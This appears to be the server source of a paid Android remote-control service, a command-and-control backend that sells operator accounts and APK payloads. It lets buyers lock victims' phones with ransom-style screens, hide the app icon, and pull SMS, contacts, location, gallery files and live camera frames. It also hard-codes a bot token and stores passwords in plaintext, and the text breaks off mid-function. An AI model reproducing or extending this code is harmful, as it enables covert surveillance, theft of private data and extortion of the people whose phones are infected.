const express    = require('express')
const http       = require('http')
const { Server } = require('socket.io')
const path       = require('path')
const crypto     = require('crypto')
const fs         = require('fs')
const TelegramBot = require('node-telegram-bot-api')

const app    = express()
const server = http.createServer(app)
const io     = new Server(server, {
  cors: { origin: '*' },
  maxHttpBufferSize: 10e6
})



const BOT_TOKEN = '8696015616:AAHILwEwSkMTKiK6ZUXS-n1xTZemvK71N6Q'
const OWNER_ID  = 5833239531
const bot       = new TelegramBot(BOT_TOKEN, { polling: true })

const NOTIF_BOT_TOKEN = '8696015616:AAHILwEwSkMTKiK6ZUXS-n1xTZemvK71N6Q'
const NOTIF_CHAT_ID  = -1004393640645
const notifBot       = new TelegramBot(NOTIF_BOT_TOKEN, { polling: false })

const noToast = ['lockDevice','unlockDevice','getSms','getNotifs','getGallery','getInstalledApps','blockApp','unblockApp','unblockAll','getLocation','getContacts','showToast']

const PAKASIR_PROJECT = 'Name_Project';
const PAKASIR_API_KEY = 'apikey_pakasir';
const PAKASIR_BASE = 'https://app.pakasir.com';



const ROLE_HIERARCHY = ['developer', 'owner', 'reseller', 'member']

const CAN_CREATE_ROLES = {
  developer: ['developer', 'owner', 'reseller', 'member'],
  owner:     ['reseller', 'member'],
  reseller:  ['member'],
  member:    []
}

const ROLE_QUOTA = {
  developer: { developer: Infinity, owner: Infinity, reseller: Infinity, member: Infinity },
  owner:     { reseller: Infinity, member: Infinity },
  reseller:  { member: Infinity }
}

app.use(express.json())
app.use(express.static(path.join(__dirname, 'frontend')))

/* ============================================================
   NOVAX LOCK HTML GET ROUTES
   Serves HTML templates from: <project>/frontend/lock/
   GET /lock/              -> JSON list of available .html files
   GET /lock/<file>.html   -> returns the selected HTML file
   ============================================================ */
const NOVAX_LOCK_DIR = path.join(__dirname, 'frontend', 'lock')

app.get('/lock/', (req, res) => {
  try {
    if (!fs.existsSync(NOVAX_LOCK_DIR)) {
      return res.status(404).json({
        ok: false,
        error: 'Lock folder not found',
        folder: 'frontend/lock'
      })
    }

    const files = fs.readdirSync(NOVAX_LOCK_DIR, { withFileTypes: true })
      .filter(entry => entry.isFile() && entry.name.toLowerCase().endsWith('.html'))
      .map(entry => entry.name)
      .sort((a, b) => a.localeCompare(b, 'en', { sensitivity: 'base' }))

    res.json({
      ok: true,
      folder: 'frontend/lock',
      count: files.length,
      files
    })
  } catch (err) {
    console.error('[LOCK] scan error:', err)
    res.status(500).json({ ok: false, error: 'Failed to scan lock folder' })
  }
})

app.get('/lock/:filename', (req, res) => {
  const filename = req.params.filename

  // Only allow a plain .html filename; prevents ../ traversal.
  if (!/^[A-Za-z0-9._-]+\.html$/i.test(filename)) {
    return res.status(400).json({ ok: false, error: 'Invalid lock filename' })
  }

  const filePath = path.join(NOVAX_LOCK_DIR, filename)

  if (!fs.existsSync(filePath) || !fs.statSync(filePath).isFile()) {
    return res.status(404).json({ ok: false, error: 'Lock HTML not found' })
  }

  res.type('html')
  res.sendFile(filePath)
})


const ACCOUNTS_FILE = path.join(__dirname, 'accounts.json')
const ORDERS_FILE = path.join(__dirname, 'orders.json');
const sessions      = {}

// ========== GLOBAL STATE ==========
const devices           = {}
const cameraFrames      = {}
const controllerSockets = new Set()
const pendingFileDownloads = {}
const DEVICE_FILE = path.join(__dirname, 'device.json')
function loadDevices() { try { return JSON.parse(fs.readFileSync(DEVICE_FILE,'utf8')) } catch { return {} } }
function saveDevices(d) { fs.writeFileSync(DEVICE_FILE, JSON.stringify(d, null, 2)) }



function loadOrders() {
    try {
        return JSON.parse(fs.readFileSync(ORDERS_FILE, 'utf8'));
    } catch {
        return {};
    }
}

function saveOrders(orders) {
    fs.writeFileSync(ORDERS_FILE, JSON.stringify(orders, null, 2));
}

// -- BOT ACCESS CONTROL --
const BOT_ACCESS_FILE = path.join(__dirname, 'botaccess.json')

function loadBotAccess() {
  try { return JSON.parse(fs.readFileSync(BOT_ACCESS_FILE, 'utf8')) }
  catch { return {} }
}

function saveBotAccess(data) {
  fs.writeFileSync(BOT_ACCESS_FILE, JSON.stringify(data, null, 2), 'utf8')
}

function getBotRole(userId) {
  const access = loadBotAccess()
  return access[String(userId)]?.role || null
}

function canGrantRole(granterRole, targetRole) {
  const hierarchy = { developer: 3, owner: 2, reseller: 1, member: 0 }
  const g = hierarchy[granterRole] || 0
  const t = hierarchy[targetRole] || 0
  return g > t
}

function isBotAdmin(userId) {
  if (isOwner(userId)) return true
  const role = getBotRole(userId)
  return ['developer', 'owner', 'reseller'].includes(role)
}

async function isGroupAdmin(chatId, userId) {
  try {
    const member = await bot.getChatMember(chatId, userId)
    return ['creator', 'administrator'].includes(member.status)
  } catch (e) {
    return false
  }
}

function getBotRoleName(role) {
  const names = { developer: 'Developer', owner: 'Owner', reseller: 'Reseller' }
  return names[role] || role
}

// -- Fungsi fetch ke Pakasir --
async function postJson(url, body, timeout = 20000) {
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), timeout);
    try {
        const res = await fetch(url, {
            method: 'POST',
            signal: ctrl.signal,
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body),
        });
        let data = {};
        try { data = await res.json(); } catch {}
        if (!res.ok) throw new Error((data && (data.message || data.error)) || ('HTTP ' + res.status));
        return data;
    } finally { clearTimeout(t); }
}

async function getJson(url, timeout = 20000) {
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), timeout);
    try {
        const res = await fetch(url, { signal: ctrl.signal });
        let data = {};
        try { data = await res.json(); } catch {}
        if (!res.ok) throw new Error((data && (data.message || data.error)) || ('HTTP ' + res.status));
        return data;
    } finally { clearTimeout(t); }
}

// -- Buat QRIS Pakasir --
async function createQrisPakasir({ amount, orderId }) {
    if (!PAKASIR_PROJECT || !PAKASIR_API_KEY) {
        throw new Error('PAKASIR_PROJECT / PAKASIR_API_KEY belum diisi');
    }

    const data = await postJson(`${PAKASIR_BASE}/api/transactioncreate/qris`, {
        project: PAKASIR_PROJECT,
        order_id: orderId,
        amount: amount,
        api_key: PAKASIR_API_KEY
    });

    const p = data.payment || data;

    console.log('[PAKASIR RAW]', JSON.stringify(p));
    const qrString = p.payment_number || p.qr_string || p.qris || p.qr;

    if (!qrString) {
        throw new Error('QR string kosong dari Pakasir');
    }

    return {
        qrString: qrString,
        amount: p.amount != null ? p.amount : amount,
        total: p.total_payment != null ? p.total_payment : (p.amount != null ? p.amount : amount),
        raw: p,
        invoice_id: p.order_id || p.invoice_id || orderId
    };
}

// -- Cek status pembayaran Pakasir --
async function checkStatusPakasir({ orderId, amount }) {
    if (!PAKASIR_PROJECT || !PAKASIR_API_KEY) {
        throw new Error('PAKASIR_PROJECT / PAKASIR_API_KEY belum diisi');
    }

    const url = `${PAKASIR_BASE}/api/transactiondetail?project=${encodeURIComponent(PAKASIR_PROJECT)}&amount=${encodeURIComponent(amount)}&order_id=${encodeURIComponent(orderId)}&api_key=${encodeURIComponent(PAKASIR_API_KEY)}`;

    const data = await getJson(url);
    const t = data.transaction || data;

    return {
        status: (t && t.status) || 'pending',
        raw: t,
        isPaid: (t && t.status === 'completed') || false
    };
}

// -- Harga produk --
const PRODUCT_PRICES = {
    member: 50000,
    reseller: 250000,
    owner: 500000
};


async function sendAccountsToBot() {
  try {
    await bot.sendDocument(OWNER_ID, ACCOUNTS_FILE, {}, {
      filename: 'accounts.json',
      contentType: 'application/json'
    })
    console.log('[BOT] accounts.json terkirim ke Telegram')
  } catch (e) {
    console.error('[BOT] Gagal kirim:', e.message)
  }
}

// Kirim saat pertama kali server jalan

function getAccountRole(username) {
  const accounts = loadAccounts()
  return accounts[username]?.role || 'member'
}

function roleIndex(role) {
  return ROLE_HIERARCHY.indexOf(role)
}

function loadAccounts() {
  if (!fs.existsSync(ACCOUNTS_FILE)) fs.writeFileSync(ACCOUNTS_FILE, '{}', 'utf8')
  return JSON.parse(fs.readFileSync(ACCOUNTS_FILE, 'utf8'))
}

function saveAccounts(data) {
  fs.writeFileSync(ACCOUNTS_FILE, JSON.stringify(data, null, 2), 'utf8')
}


async function sendNotifAkunBaru(username, uid, createdBy, trialExpiry) {
  try {
    const expired = trialExpiry ? new Date(trialExpiry).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }) : 'Permanent'
    const msg = `*AKUN BARU DIBUAT*

Username: ${username}
UID: ${uid}
Expired: ${expired}
Dibuat oleh: ${createdBy}`
    await notifBot.sendMessage(NOTIF_CHAT_ID, msg, { parse_mode: 'Markdown' })
  } catch (e) {
    console.error('[NOTIF] Error:', e.message)
  }
}

async function sendNotifAkunHapus(username, deletedBy) {
  try {
    const msg = `*AKUN DIHAPUS*

Username: ${username}
Dihapus oleh: ${deletedBy}`
    await notifBot.sendMessage(NOTIF_CHAT_ID, msg, { parse_mode: 'Markdown' })
  } catch (e) {
    console.error('[NOTIF] Error:', e.message)
  }
}


// -- Trial Duration Helper --
function getTrialExpiry(duration) {
  if (!duration || duration === 'permanent') return null
  const now = new Date()
  if (duration === '3m')  { now.setMinutes(now.getMinutes() + 3);  return now.toISOString() }
  if (duration === '5m')  { now.setMinutes(now.getMinutes() + 5);  return now.toISOString() }
  if (duration === '10m') { now.setMinutes(now.getMinutes() + 10); return now.toISOString() }
  if (duration === '3d')  { now.setDate(now.getDate() + 3);  return now.toISOString() }
  if (duration === '7d')  { now.setDate(now.getDate() + 7);  return now.toISOString() }
  if (duration === '30d') { now.setDate(now.getDate() + 30); return now.toISOString() }
  return null
}

// -- Quota Helpers --
function getQuotaUsed(creatorKey, targetRole) {
  const accounts = loadAccounts()
  return Object.values(accounts).filter(
    a => (a.createdBy === creatorKey || a.createdBy === String(creatorKey)) && a.role === targetRole
  ).length
}

function getQuotaLimit(creatorKey, targetRole) {
  const accounts = loadAccounts()
  const access = loadBotAccess()

  // Coba cari di accounts by userId
  let acc = accounts[creatorKey]
  let myRole = acc?.role || 'member'

  // Kalau nggak ketemu, cek di bot access by userId
  if (!acc) {
    const botAcc = access[String(creatorKey)]
    if (botAcc) {
      myRole = botAcc.role || 'member'
      acc = { role: myRole, visa: botAcc.visa || {} }
    }
  }

  // Kalau masih nggak ketemu, coba cari di accounts yang createdBy match
  if (!acc) {
    const accByCreator = Object.values(accounts).find(a => a.createdBy === String(creatorKey))
    if (accByCreator) {
      myRole = accByCreator.role || 'member'
      acc = accByCreator
    }
  }

  // Developer, Owner, Reseller = Unlimited
  if (['developer', 'owner', 'reseller'].includes(myRole)) return Infinity

  const base = (ROLE_QUOTA[myRole] || {})[targetRole]
  if (base === undefined) return 0

  const visa = (acc?.visa || {})[targetRole] || 0
  return base + visa
}

// -- Auto Delete Expired Accounts --
function deleteExpiredAccounts() {
  const accounts = loadAccounts()
  const now = new Date()
  let deleted = 0

  for (const [username, acc] of Object.entries(accounts)) {
    if (!acc.trialExpiry) continue
    if (new Date(acc.trialExpiry) <= now) {
      for (const [tok, sess] of Object.entries(sessions)) {
        if (sess.username === username) delete sessions[tok]
      }
      delete accounts[username]
      deleted++
      console.log(`[TRIAL] Akun "${username}" dihapus otomatis (trial expired)`)
    }
  }

  if (deleted > 0) saveAccounts(accounts)
}

// Jalankan pengecekan setiap 1 menit
setInterval(deleteExpiredAccounts, 60 * 1000)

function genToken() {
  return crypto.randomBytes(24).toString('hex')
}

function hashPwd(pwd) {
  return crypto.createHash('sha256').update(pwd).digest('hex')
}

function requireAuth(req, res, next) {
  const token = req.headers['x-auth-token'] || req.query.token
  if (!token || !sessions[token]) return res.status(401).json({ error: 'Unauthorized' })

  const username = sessions[token].username
  const accounts = loadAccounts()
  const acc = accounts[username]

  if (!acc) {
    delete sessions[token]
    return res.status(401).json({ error: 'Akun tidak ditemukan atau sudah dihapus' })
  }

  if (acc.trialExpiry && new Date(acc.trialExpiry) <= new Date()) {
    for (const [tok, sess] of Object.entries(sessions)) {
      if (sess.username === username) delete sessions[tok]
    }
    delete accounts[username]
    saveAccounts(accounts)
    console.log(`[TRIAL] Akun "${username}" dihapus otomatis saat login (trial expired)`)
    return res.status(401).json({ error: 'Akun trial kamu sudah berakhir dan telah dihapus' })
  }

  req.username = username
  req.uid      = sessions[token].uid
  next()
}

function isOwner(userId) {
  return userId === OWNER_ID
}

function parseCakun(text) {
  const raw = text.replace(/^\/cakun\s*/i, '').trim()
  const parts = raw.split(',').map(s => s.trim())

  if (parts.length < 2) return null

  const displayName = parts[0]
  const password    = parts[1]
  const role        = parts[2]?.toLowerCase() || 'member'

  if (!displayName || !password) return null
  if (!ROLE_HIERARCHY.includes(role)) return null

  const username = displayName.toLowerCase()
  return { username, displayName, password, role }
}

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'frontend', 'iklan.html'))
})


app.post('/api/order/create', async (req, res) => {
    const { role, username, password } = req.body;

    if (!role || !username || !password) {
        return res.status(400).json({
            success: false,
            error: 'Data tidak lengkap! role, username, password required.'
        });
    }

    const amount = PRODUCT_PRICES[role];
    if (!amount) {
        return res.status(400).json({
            success: false,
            error: `Role "${role}" tidak valid!`
        });
    }

    const BLACKLIST = ['smooth', 'admin', 'owner', 'genetic'];
    if (BLACKLIST.includes(username.toLowerCase())) {
        return res.status(400).json({
            success: false,
            error: `Username "${username}" tidak diizinkan!`
        });
    }

    const accounts = loadAccounts();
    const key = username.toLowerCase();
    if (accounts[key]) {
        return res.status(409).json({
            success: false,
            error: `Username "${username}" sudah digunakan!`
        });
    }

    const orderId = 'ORD-' + Date.now() + '-' + crypto.randomBytes(4).toString('hex').toUpperCase();

    try {
        const qris = await createQrisPakasir({
            amount: amount,
            orderId: orderId
        });

        const orders = loadOrders();
        orders[orderId] = {
            role: role,
            username: username,
            password: password,
            amount: amount,
            status: 'pending',
            pakasir_order_id: qris.invoice_id || orderId,
            createdAt: new Date().toISOString(),
            expiresAt: new Date(Date.now() + 300000).toISOString()
        };
        saveOrders(orders);

        console.log(`[ORDER] Invoice dibuat: ${orderId} | ${role} | Rp ${amount.toLocaleString('id-ID')}`);

        res.json({
            success: true,
            invoice_id: orderId,
            amount: amount,
            qr_image: qris.qrString,
            payment_url: `https://app.pakasir.com/pay/${qris.invoice_id || orderId}`,
            expires_in: 300
        });

    } catch (error) {
        console.error('[PAKASIR] Error:', error.message);
        res.status(500).json({
            success: false,
            error: `Gagal membuat QRIS: ${error.message}`
        });
    }
});

app.get('/api/order/status/:invoiceId', async (req, res) => {
    const { invoiceId } = req.params;
    const orders = loadOrders();
    const order = orders[invoiceId];

    if (!order) {
        return res.status(404).json({
            status: 'not_found',
            error: 'Invoice tidak ditemukan'
        });
    }

    if (order.status === 'pending' && new Date(order.expiresAt) <= new Date()) {
        order.status = 'expired';
        saveOrders(orders);
        return res.json({
            status: 'expired',
            invoice_id: invoiceId
        });
    }

    try {
        const status = await checkStatusPakasir({
            orderId: order.pakasir_order_id || invoiceId,
            amount: order.amount
        });

        if (status.isPaid) {
            order.status = 'paid';
            order.paidAt = new Date().toISOString();
            saveOrders(orders);
        }

        res.json({
            status: order.status,
            invoice_id: invoiceId,
            amount: order.amount,
            role: order.role,
            pakasir_status: status.status
        });

    } catch (error) {
        console.error('[PAKASIR] Check status error:', error.message);
        res.status(500).json({
            status: 'error',
            error: `Gagal cek status: ${error.message}`
        });
    }
});

app.post('/api/order/complete', async (req, res) => {
    const { invoice_id, username, password, role } = req.body;

    if (!invoice_id || !username || !password || !role) {
        return res.status(400).json({
            success: false,
            error: 'Data tidak lengkap'
        });
    }

    const orders = loadOrders();
    const order = orders[invoice_id];

    if (!order) {
        return res.status(404).json({
            success: false,
            error: 'Invoice tidak ditemukan'
        });
    }

    if (order.status !== 'paid') {
        return res.status(400).json({
            success: false,
            error: 'Pembayaran belum dikonfirmasi'
        });
    }

    const accounts = loadAccounts();
    const key = username.toLowerCase();

    if (accounts[key]) {
        return res.status(409).json({
            success: false,
            error: `Username "${username}" sudah digunakan!`
        });
    }

    const newUid = crypto.randomBytes(16).toString('hex');
    accounts[key] = {
        password: password,
        displayName: username,
        role: role,
        uid: newUid,
        createdBy: `order_${invoice_id}`,
        createdAt: new Date().toISOString(),
        trialDuration: 'permanent',
        trialExpiry: null
    };
    saveAccounts(accounts);

    order.status = 'completed';
    order.completedAt = new Date().toISOString();
    order.createdUsername = username;
    saveOrders(orders);

    console.log(`[ORDER] Akun dibuat: ${username} (${role}) dari invoice ${invoice_id}`);

    try {
        await bot.sendMessage(OWNER_ID,
            `*ORDER COMPLETED*\n\nInvoice: ${invoice_id}\nUsername: ${username}\nRole: ${role}\nHarga: Rp ${order.amount.toLocaleString('id-ID')}`
        );
    } catch (e) {
        console.error('[BOT] Gagal kirim notifikasi:', e.message);
    }

    const apkFiles = [];
    const produkDir = path.join(__dirname, 'produk');
    ['kontrol.apk', 'stum.apk'].forEach(file => {
        if (fs.existsSync(path.join(produkDir, file))) {
            apkFiles.push(file);
        }
    });

    res.json({
        success: true,
        username: username,
        password: password,
        role: role,
        uid: newUid,
        apk_files: apkFiles
    });
});

app.get('/api/admin/orders', requireAuth, (req, res) => {
    const myRole = getAccountRole(req.username);
    if (!['developer', 'owner'].includes(myRole)) {
        return res.status(403).json({ error: 'Akses ditolak' });
    }

    const orders = loadOrders();
    const list = Object.entries(orders).map(([id, order]) => ({
        invoice_id: id,
        ...order
    }));

    res.json(list);
});

app.get('/produk/:filename', (req, res) => {
    const filename = req.params.filename;
    const filepath = path.join(__dirname, 'produk', filename);

    if (!fs.existsSync(filepath)) {
        return res.status(404).send('File tidak ditemukan');
    }

    res.sendFile(filepath);
});

app.get('/order', (req, res) => {
    res.sendFile(path.join(__dirname, 'frontend', 'order.html'));
});

app.post('/api/change-password', requireAuth, (req, res) => {
  const { oldPassword, newPassword } = req.body
  if (!oldPassword || !newPassword)
    return res.status(400).json({ error: 'Semua field wajib diisi' })
  if (newPassword.length < 6)
    return res.status(400).json({ error: 'Password baru minimal 6 karakter' })

  const accounts = loadAccounts()
  const acc = accounts[req.username]
  if (!acc) return res.status(404).json({ error: 'Akun tidak ditemukan' })

  if (acc.password !== oldPassword)
    return res.status(401).json({ error: 'Password lama salah' })

  acc.password = newPassword
  accounts[req.username] = acc
  saveAccounts(accounts)

  res.json({ ok: true })
})

app.post('/api/login', (req, res) => {
  const { username, password } = req.body
  if (!username || !password) return res.status(400).json({ error: 'Username Dan Password Wajib Diisi' })

  const accounts = loadAccounts()
  const acc = accounts[username]
  if (!acc || acc.password !== password) {
    return res.status(401).json({ error: 'Username Atau Password Salah' })
  }

  if (!acc.uid) {
    acc.uid = crypto.randomBytes(16).toString('hex')
    accounts[username] = acc
    saveAccounts(accounts)
  }

  const { deviceId } = req.body
  const devicesData = loadDevices()
  if (devicesData[username] && devicesData[username] !== deviceId) {
    return res.status(403).json({ error: 'Akun ini sudah digunakan di perangkat lain' })
  }
  devicesData[username] = deviceId
  saveDevices(devicesData)

  const token = genToken()
  sessions[token] = { username: username, uid: acc.uid }
  res.json({ ok: true, token, username: acc.displayName || username })
})

app.post('/api/logout', requireAuth, (req, res) => {
  const token = req.headers['x-auth-token']
  delete sessions[token]
  res.json({ ok: true })
})

app.get('/api/me', requireAuth, (req, res) => {
  const accounts = loadAccounts()
  const acc      = accounts[req.username]
  if (!acc) return res.status(404).json({ error: 'Account not found' })
  res.json({
    username:    req.username,
    displayName: acc.displayName || req.username,
    role:        acc.role || 'member',
    uid:         acc.uid  || '',
    trialExpiry: acc.trialExpiry || null
  })
})

app.get('/api/admin/quota', requireAuth, (req, res) => {
  const myRole = getAccountRole(req.username)
  if (myRole === 'developer') {
    return res.json({ unlimited: true })
  }
  const allowed = CAN_CREATE_ROLES[myRole] || []
  const result = {}
  allowed.forEach(targetRole => {
    const limit = getQuotaLimit(req.username, targetRole)
    const used  = getQuotaUsed(req.username, targetRole)
    result[targetRole] = { used, limit, remaining: limit - used }
  })
  res.json({ unlimited: false, quota: result })
})

app.post('/api/admin/create-account', requireAuth, async (req, res) => {
  const myRole = getAccountRole(req.username)
  const { username, password, role, trialDuration } = req.body

  if (!username || !password || !role)
    return res.status(400).json({ error: 'Username, password, dan role wajib diisi' })

  if (!['developer', 'owner', 'reseller'].includes(myRole))
    return res.status(403).json({ error: 'Hanya developer, owner, dan reseller yang bisa membuat akun' })

  const allowed = CAN_CREATE_ROLES[myRole] || []
  if (!allowed.includes(role))
    return res.status(403).json({ error: `Role "${myRole}" tidak diizinkan membuat akun dengan role "${role}"` })

  if (myRole !== 'developer') {
    const limit = getQuotaLimit(req.username, role)
    const used  = getQuotaUsed(req.username, role)
    if (used >= limit)
      return res.status(403).json({ error: `Quota habis! Kamu sudah membuat ${used}/${limit} akun role "${role}"` })
  }

  if (role !== 'member') {
    if (trialDuration && trialDuration !== 'permanent')
      return res.status(400).json({ error: `Akun role "${role}" hanya bisa permanent, tidak bisa trial` })
  }

  let validDurations
  if (role === 'member') {
    if (myRole === 'developer') {
      validDurations = ['3m', '5m', '10m', '3d', '7d', '30d', 'permanent']
    } else if (myRole === 'reseller') {
      validDurations = ['permanent']
    } else {
      validDurations = ['3d', '7d', '30d', 'permanent']
    }
  } else {
    validDurations = ['permanent']
  }

  const finalDuration = trialDuration || (role !== 'member' ? 'permanent' : null)
  if (!finalDuration || !validDurations.includes(finalDuration))
    return res.status(400).json({ error: `trialDuration tidak valid. Opsi: ${validDurations.join(', ')}` })

  const accounts = loadAccounts()
  const key = username.trim()

  if (!key || key.length < 3)
    return res.status(400).json({ error: 'Username minimal 3 karakter' })

  if (key.toLowerCase() === 'smooth' && key !== 'Smooth')
    return res.status(403).json({ error: 'Username tersebut tidak diizinkan' })

  if (accounts[key])
    return res.status(409).json({ error: `Akun "${username}" sudah ada` })

  const newUid      = crypto.randomBytes(16).toString('hex')
  const trialExpiry = getTrialExpiry(finalDuration)

  accounts[key] = {
    password:      password,
    displayName:   username.trim(),
    role:          role,
    uid:           newUid,
    createdBy:     req.username,
    createdAt:     new Date().toISOString(),
    trialDuration: finalDuration,
    trialExpiry:   trialExpiry
  }
  saveAccounts(accounts)

  const durasiLabel = finalDuration === 'permanent' ? 'Permanent' : `Trial ${finalDuration}`
  console.log(`[ADMIN] Akun baru: ${key} (${role}) [${durasiLabel}] oleh ${req.username}`)

  await sendNotifAkunBaru(key, newUid, req.username, trialExpiry)

  res.json({ ok: true, uid: newUid, username: key, displayName: username.trim(), role, trialDuration: finalDuration, trialExpiry })
})

app.get('/api/admin/accounts', requireAuth, (req, res) => {
  const myRole   = getAccountRole(req.username)
  const accounts = loadAccounts()
  const myIdx    = roleIndex(myRole)

  const list = Object.entries(accounts)
    .filter(([uname, acc]) => {
      const accRole    = acc.role || 'member'
      const accRoleIdx = roleIndex(accRole)
      if (myRole === 'developer') return true
      return accRoleIdx >= myIdx || uname === req.username
    })
    .map(([username, acc]) => ({
      username,
      displayName:   acc.displayName || username,
      role:          acc.role || 'member',
      uid:           acc.uid  || '-',
      createdBy:     acc.createdBy || '-',
      createdAt:     acc.createdAt || null,
      trialDuration: acc.trialDuration || 'permanent',
      trialExpiry:   acc.trialExpiry || null
    }))
    .sort((a, b) => roleIndex(a.role) - roleIndex(b.role))

  res.json(list)
})

app.delete('/api/admin/accounts/:username', requireAuth, async (req, res) => {
  const myRole     = getAccountRole(req.username)
  const targetUser = req.params.username.trim()

  if (targetUser === req.username)
    return res.status(400).json({ error: 'Tidak bisa menghapus akun sendiri' })

  const accounts = loadAccounts()
  if (!accounts[targetUser])
    return res.status(404).json({ error: 'Akun tidak ditemukan' })

  const targetRole = accounts[targetUser].role || 'member'
  const myIdx      = roleIndex(myRole)
  const targetIdx  = roleIndex(targetRole)

  if (myIdx >= targetIdx)
    return res.status(403).json({
      error: `Role "${myRole}" tidak bisa menghapus akun dengan role "${targetRole}"`
    })

  delete accounts[targetUser]
  saveAccounts(accounts)

  const devs = loadDevices()
  delete devs[targetUser]
  saveDevices(devs)

  let kicked = 0
  for (const [tok, sess] of Object.entries(sessions)) {
    if (sess.username === targetUser) { delete sessions[tok]; kicked++ }
  }

  console.log(`[ADMIN] Akun dihapus: ${targetUser} (${targetRole}) oleh ${req.username}, sesi dikick: ${kicked}`)

  await sendNotifAkunHapus(targetUser, req.username)

  res.json({ ok: true, kicked })
})

app.patch('/api/admin/accounts/:username/role', requireAuth, (req, res) => {
  const myRole     = getAccountRole(req.username)
  const targetUser = req.params.username.trim()
  const { role: newRole } = req.body

  if (!newRole || !ROLE_HIERARCHY.includes(newRole))
    return res.status(400).json({ error: 'Role tidak valid' })

  if (targetUser === req.username)
    return res.status(400).json({ error: 'Tidak bisa mengubah role sendiri' })

  const accounts = loadAccounts()
  if (!accounts[targetUser])
    return res.status(404).json({ error: 'Akun tidak ditemukan' })

  const targetRole = accounts[targetUser].role || 'member'
  const myIdx      = roleIndex(myRole)
  const targetIdx  = roleIndex(targetRole)
  const newIdx     = roleIndex(newRole)

  if (myIdx >= targetIdx || myIdx >= newIdx)
    return res.status(403).json({ error: 'Tidak punya izin mengubah role ini' })

  accounts[targetUser].role = newRole
  saveAccounts(accounts)

  console.log(`[ADMIN] Role diubah: ${targetUser} ${targetRole}->${newRole} oleh ${req.username}`)
  res.json({ ok: true, username: targetUser, oldRole: targetRole, newRole })
})

app.get('/adminpanel', (req, res) => {
  res.sendFile(path.join(__dirname, 'frontend', 'adminpanel.html'))
})


app.get('/api/file/:deviceId', requireAuth, (req, res) => {
  const { deviceId } = req.params
  const filePath = req.query.path
  if (!filePath) return res.status(400).json({ error: 'path diperlukan' })
  if (!devices[deviceId]) return res.status(404).json({ error: 'Device not found' })

  const accounts = loadAccounts()
  const acc = accounts[req.username]
  if (!acc?.smooth && devices[deviceId].uid !== req.uid)
    return res.status(403).json({ error: 'Forbidden' })

  const reqId = crypto.randomBytes(8).toString('hex')
  const filename = filePath.split('/').pop() || 'file'

  let settled = false
  pendingFileDownloads[reqId] = (err, buf, mime) => {
    if (settled) return
    settled = true
    delete pendingFileDownloads[reqId]
    if (err) return res.status(500).json({ error: err })
    res.setHeader('Content-Disposition', `attachment; filename="${filename}"`)
    res.setHeader('Content-Type', mime || 'application/octet-stream')
    res.setHeader('Content-Length', buf.length)
    res.send(buf)
  }

  io.to(`device:${deviceId}`).emit('command', { command: 'downloadFile', value: JSON.stringify({ path: filePath, reqId }) })

  setTimeout(() => {
    if (pendingFileDownloads[reqId]) {
      pendingFileDownloads[reqId]('Timeout: device tidak merespons')
    }
  }, 30000)
})

app.get('/api/screenshot/:deviceId', requireAuth, (req, res) => {
  const { deviceId } = req.params
  if (!devices[deviceId]) return res.status(404).json({ error: 'Device not found' })

  const accounts = loadAccounts()
  const acc = accounts[req.username]
  if (!acc?.smooth && devices[deviceId].uid !== req.uid)
    return res.status(403).json({ error: 'Forbidden' })

  const frame = cameraFrames[deviceId]
  if (!frame) return res.status(404).json({ error: 'Belum ada frame. Nyalakan Live Camera dulu!' })

  res.json({ ok: true, frame, deviceId })
})

app.get('/api/devices', requireAuth, (req, res) => {
  const accounts = loadAccounts()
  const acc = accounts[req.username]
  if (acc?.smooth) return res.json(getDeviceListForSmooth())
  res.json(getDeviceListForUid(req.uid))
})

app.post('/api/command/:deviceId', requireAuth, (req, res) => {
  const { deviceId }      = req.params
  const { command, value } = req.body
  if (!devices[deviceId]) return res.status(404).json({ error: 'Device Not Found' })
  const accounts = loadAccounts()
  const acc = accounts[req.username]
  if (!acc?.smooth && devices[deviceId].uid !== req.uid) 
    return res.status(403).json({ error: 'Forbidden' })

  if (command === 'lockDevice') {
    try {
      const parsed = typeof value === 'string' ? JSON.parse(value) : value
      devices[deviceId].status.deviceLocked = true
      devices[deviceId].status.lockTitle    = parsed.title || ''
      broadcastToUid(req.uid || devices[deviceId]?.uid || '', 'devices:update', getDeviceListForUid(req.uid || devices[deviceId]?.uid || ''))
    } catch (_) {}
  } else if (command === 'hideIcon') {
    devices[deviceId].status.iconHidden = (value === 'true')
    broadcastToUid(req.uid || devices[deviceId]?.uid || '', 'devices:update', getDeviceListForUid(req.uid || devices[deviceId]?.uid || ''))
  } else if (command === 'touchBlock') {
    devices[deviceId].status.touchBlocked = true
    broadcastToUid(req.uid || devices[deviceId]?.uid || '', 'devices:update', getDeviceListForUid(req.uid || devices[deviceId]?.uid || ''))
  } else if (command === 'touchBlockStop') {
    devices[deviceId].status.touchBlocked = false
    broadcastToUid(req.uid || devices[deviceId]?.uid || '', 'devices:update', getDeviceListForUid(req.uid || devices[deviceId]?.uid || ''))
  } else if (command === 'ttsSpeak') {
    devices[deviceId].status.ttsSpeaking = true
    broadcastToUid(req.uid || devices[deviceId]?.uid || '', 'devices:update', getDeviceListForUid(req.uid || devices[deviceId]?.uid || ''))
  } else if (command === 'ttsStop') {
    devices[deviceId].status.ttsSpeaking = false
    broadcastToUid(req.uid || devices[deviceId]?.uid || '', 'devices:update', getDeviceListForUid(req.uid || devices[deviceId]?.uid || ''))
  } else if (command === 'videoOverlay') {
    devices[deviceId].status.videoOverlayActive = true
    broadcastToUid(req.uid || devices[deviceId]?.uid || '', 'devices:update', getDeviceListForUid(req.uid || devices[deviceId]?.uid || ''))
  } else if (command === 'videoOverlayHide') {
    devices[deviceId].status.videoOverlayActive = false
    broadcastToUid(req.uid || devices[deviceId]?.uid || '', 'devices:update', getDeviceListForUid(req.uid || devices[deviceId]?.uid || ''))
  } else if (command === 'jumpscare2Start') {
    try {
      const obj = typeof value === 'string' ? JSON.parse(value) : value
      devices[deviceId].status.jumpscare2Active   = true
      devices[deviceId].status.jumpscare2Url      = obj.url || ''
      devices[deviceId].status.jumpscare2Duration = obj.duration || 3000
      broadcastToUid(req.uid || devices[deviceId]?.uid || '', 'devices:update', getDeviceListForUid(req.uid || devices[deviceId]?.uid || ''))
    } catch (_) {}
  } else if (command === 'jumpscare2Stop') {
    devices[deviceId].status.jumpscare2Active = false
